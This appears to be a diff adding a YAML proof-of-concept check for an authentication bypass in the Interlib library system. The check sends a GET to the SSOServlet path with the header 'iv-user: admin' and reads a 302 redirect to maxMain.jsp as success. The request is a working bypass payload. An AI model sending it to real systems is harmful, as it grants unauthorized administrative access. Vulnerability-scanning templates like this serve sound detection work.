@@ -1,0 +1,15 @@
+name: poc-yaml-interlib-unauthorized
+rules:
+  - method: GET
+    path: /interlib/common/SSOServlet?
+    follow_redirects: false
+    headers:
+      iv-user: admin
+    expression: |
+      response.status == 302 && response.headers["Location"].contains("/common/maxMain.jsp")
+detail:
+    info: |
+      添加header头绕过认证iv-user: admin
+    author: test
+    links:
+        - https://mp.weixin.qq.com/s/m62vycwdHonSMk7eGyIDeA
